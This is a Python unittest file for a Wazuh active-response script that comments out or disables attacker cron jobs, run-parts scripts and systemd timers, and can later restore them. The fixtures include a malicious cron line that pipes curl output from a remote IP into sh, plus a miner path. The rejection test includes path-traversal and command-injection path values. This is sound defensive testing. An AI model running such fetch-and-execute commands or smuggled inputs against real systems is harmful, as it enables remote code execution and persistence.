"""Pruebas del script de Active Response kronos-revertir-tarea para Linux.

El script se carga con runpy y trabaja sobre una raíz temporal (RAIZ): /etc/cron.d, las
carpetas run-parts y /etc/systemd/system son carpetas de prueba, y systemctl se simula.
"""

from __future__ import annotations

import io
import json
import os
import runpy
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

SCRIPT = (
    Path(__file__).resolve().parents[2]
    / "infra" / "wazuh" / "active-response" / "linux" / "kronos-revertir-tarea"
)

CRON = """SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
# tarea del atacante
*/5 * * * * root curl -s http://198.51.100.7/x.sh | sh
@reboot root /tmp/.x/minero
"""
CRONTAB = """SHELL=/bin/sh
17 *	* * *	root	cd / && run-parts --report /etc/cron.hourly
*/10 * * * * root /tmp/.x/minero
"""


class Systemd:
    def __init__(self, habilitado=True, activo=True, falla=False):
        self.habilitado, self.activo, self.falla = habilitado, activo, falla
        self.comandos = []

    def correr(self, cmd):
        self.comandos.append(cmd)
        if self.falla and cmd[1] in ("disable", "enable", "start"):
            return subprocess.CompletedProcess(cmd, 1, "", "fallo simulado")
        if cmd[1] == "is-enabled":
            return subprocess.CompletedProcess(cmd, 0, "enabled\n" if self.habilitado else "disabled\n", "")
        if cmd[1] == "is-active":
            return subprocess.CompletedProcess(cmd, 0, "active\n" if self.activo else "inactive\n", "")
        if cmd[1:3] == ["disable", "--now"]:
            self.habilitado = self.activo = False
        elif cmd[1] == "enable":
            self.habilitado = True
        elif cmd[1] == "start":
            self.activo = True
        return subprocess.CompletedProcess(cmd, 0, "", "")


@unittest.skipIf(os.name == "nt", "el script es de Linux")
class RevertirTarea(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.raiz = Path(self.tmp.name)
        for carpeta in ("etc/cron.d", "etc/cron.daily", "etc/systemd/system", "var/spool/cron/crontabs",
                        "var/ossec/active-response", "var/ossec/logs"):
            (self.raiz / carpeta).mkdir(parents=True)
        self.main = runpy.run_path(str(SCRIPT), run_name="kronos_revertir_tarea")["main"]
        self.systemd = Systemd()

    def tearDown(self):
        self.tmp.cleanup()

    def archivo(self, ruta, texto, modo=0o644):
        p = self.raiz / ruta.lstrip("/")
        p.write_text(texto)
        p.chmod(modo)
        return p

    def correr(self, entrada):
        if not isinstance(entrada, str):
            entrada = json.dumps({"version": 1, "command": "add", "parameters": {"extra_args": entrada}})
        cambios = {"RAIZ": str(self.raiz), "LOG": str(self.raiz / "var/ossec/logs/active-responses.log"),
                   "correr": self.systemd.correr}
        with mock.patch.dict(self.main.__globals__, cambios), \
             mock.patch("sys.stdin", io.StringIO(entrada + "\n")):
            return self.main()

    def ultima_linea(self):
        return (self.raiz / "var/ossec/logs/active-responses.log").read_text().splitlines()[-1]

    # --- cron

    def test_cron_d_comenta_las_tareas_y_deja_las_variables(self):
        p = self.archivo("/etc/cron.d/actualizador", CRON)
        self.assertEqual(self.correr(["aplicar", "/etc/cron.d/actualizador"]), 0)
        texto = p.read_text()
        self.assertIn("\nSHELL=/bin/sh", "\n" + texto)
        self.assertIn("#kronos# */5 * * * * root curl", texto)
        self.assertIn("#kronos# @reboot root /tmp/.x/minero", texto)
        self.assertIn("\n# tarea del atacante\n", texto)
        self.assertIn("OK (2 lineas)", self.ultima_linea())

    def test_cron_conserva_permisos(self):
        p = self.archivo("/var/spool/cron/crontabs/usuario", "*/1 * * * * /tmp/x\n", 0o600)
        self.correr(["aplicar", "/var/spool/cron/crontabs/usuario"])
        self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o600)

    def test_cron_aplicar_dos_veces_y_habilitar(self):
        p = self.archivo("/etc/cron.d/actualizador", CRON)
        self.correr(["aplicar", "/etc/cron.d/actualizador"])
        self.assertEqual(self.correr(["aplicar", "/etc/cron.d/actualizador"]), 0)
        self.assertIn("ya la habia desactivado Kronos", self.ultima_linea())
        self.assertEqual(self.correr(["habilitar", "/etc/cron.d/actualizador"]), 0)
        self.assertEqual(p.read_text(), CRON)
        self.assertEqual(self.correr(["habilitar", "/etc/cron.d/actualizador"]), 0)
        self.assertIn("no la desactivo Kronos", self.ultima_linea())

    def test_habilitar_no_toca_lo_que_comento_otra_persona(self):
        texto = "# */5 * * * * root /usr/bin/respaldo\n"
        p = self.archivo("/etc/cron.d/respaldo", texto)
        self.assertEqual(self.correr(["habilitar", "/etc/cron.d/respaldo"]), 0)
        self.assertEqual(p.read_text(), texto)

    def test_crontab_no_toca_run_parts(self):
        p = self.archivo("/etc/crontab", CRONTAB)
        self.assertEqual(self.correr(["aplicar", "/etc/crontab"]), 0)
        texto = p.read_text()
        self.assertIn("\n17 *\t* * *\troot\tcd / && run-parts", texto)
        self.assertIn("#kronos# */10 * * * * root /tmp/.x/minero", texto)

    # --- run-parts

    def test_run_parts_quita_y_devuelve_la_ejecucion(self):
        p = self.archivo("/etc/cron.daily/actualizar", "#!/bin/sh\n/tmp/x\n", 0o755)
        self.assertEqual(self.correr(["aplicar", "/etc/cron.daily/actualizar"]), 0)
        self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o644)
        self.assertEqual(self.correr(["aplicar", "/etc/cron.daily/actualizar"]), 0)
        self.assertIn("ya la habia desactivado Kronos", self.ultima_linea())
        self.assertEqual(self.correr(["habilitar", "/etc/cron.daily/actualizar"]), 0)
        self.assertEqual(stat.S_IMODE(p.stat().st_mode), 0o755)
        marcas = json.loads((self.raiz / "var/ossec/active-response/kronos-tareas.json").read_text())
        self.assertEqual(marcas, {})

    def test_run_parts_que_no_era_ejecutable(self):
        self.archivo("/etc/cron.daily/apagado", "#!/bin/sh\n", 0o644)
        self.assertEqual(self.correr(["aplicar", "/etc/cron.daily/apagado"]), 0)
        self.assertIn("no era ejecutable", self.ultima_linea())
        self.assertEqual(self.correr(["habilitar", "/etc/cron.daily/apagado"]), 0)
        self.assertIn("no la desactivo Kronos", self.ultima_linea())

    # --- systemd

    def test_timer_se_deshabilita_y_vuelve_como_estaba(self):
        self.archivo("/etc/systemd/system/actualizador.timer", "[Timer]\nOnCalendar=*:0/5\n")
        self.assertEqual(self.correr(["aplicar", "/etc/systemd/system/actualizador.timer"]), 0)
        self.assertIn(["systemctl", "disable", "--now", "actualizador.timer"], self.systemd.comandos)
        self.assertFalse(self.systemd.habilitado or self.systemd.activo)
        self.assertEqual(self.correr(["aplicar", "/etc/systemd/system/actualizador.timer"]), 0)
        self.assertIn("ya lo habia desactivado Kronos", self.ultima_linea())
        self.assertEqual(self.correr(["habilitar", "/etc/systemd/system/actualizador.timer"]), 0)
        self.assertTrue(self.systemd.habilitado and self.systemd.activo)

    def test_timer_que_no_estaba_habilitado(self):
        self.systemd = Systemd(habilitado=False, activo=False)
        self.archivo("/etc/systemd/system/viejo.timer", "[Timer]\n")
        self.assertEqual(self.correr(["aplicar", "/etc/systemd/system/viejo.timer"]), 0)
        self.assertIn("no estaba habilitado", self.ultima_linea())
        self.assertNotIn("disable", [c[1] for c in self.systemd.comandos])

    def test_timer_que_falla(self):
        self.systemd = Systemd(falla=True)
        self.archivo("/etc/systemd/system/actualizador.timer", "[Timer]\n")
        self.assertEqual(self.correr(["aplicar", "/etc/systemd/system/actualizador.timer"]), 1)
        self.assertIn("fallo simulado", self.ultima_linea())

    # --- rechazos

    def test_rutas_rechazadas(self):
        self.archivo("/etc/cron.d/wazuh-agente", "* * * * * root /bin/true\n")
        self.archivo("/etc/systemd/system/sshd.service", "[Service]\n")
        enlace = self.raiz / "etc/cron.d/enlace"
        enlace.symlink_to(self.raiz / "etc/cron.d/wazuh-agente")
        for ruta in (
            "/etc/passwd",
            "/etc/crontab.bak",
            "/etc/cron.d/wazuh-agente",
            "/etc/systemd/system/sshd.service",
            "/etc/systemd/system/systemd-tmpfiles-clean.timer",
            "/etc/systemd/system/multi-user.target.wants/x.timer",
            "/etc/cron.daily/sub/x",
            "/etc/cron.d/../passwd",
            "/etc/cron.d/x;y",
            "/etc/cron.d/noexiste",
            "/etc/cron.d/enlace",
            "etc/cron.d/x",
        ):
            with self.subTest(ruta=ruta):
                self.assertEqual(self.correr(["aplicar", ruta]), 1)
                self.assertIn("rechazada", self.ultima_linea())

    def test_argumentos_invalidos(self):
        self.archivo("/etc/cron.d/actualizador", CRON)
        for entrada in (
            ["borrar", "/etc/cron.d/actualizador"],
            ["aplicar"],
            ["aplicar", "/etc/cron.d/actualizador", "extra"],
            ["aplicar", 5],
            "",
            "no es json",
        ):
            with self.subTest(entrada=entrada):
                self.assertEqual(self.correr(entrada), 1)
        self.assertEqual((self.raiz / "etc/cron.d/actualizador").read_text(), CRON)


if __name__ == "__main__":
    unittest.main()
